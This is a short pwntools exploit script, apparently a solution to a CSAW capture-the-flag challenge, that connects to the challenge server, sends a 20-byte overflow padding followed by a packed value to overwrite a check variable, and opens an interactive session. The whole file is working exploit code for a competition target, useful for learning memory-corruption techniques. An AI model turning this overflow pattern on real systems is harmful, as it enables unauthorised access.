from pwn import *
conn=remote('pwn.chal.csaw.io',9000)
conn.sendline('a'*20+p32(0xcaf3baee))
conn.interactive()
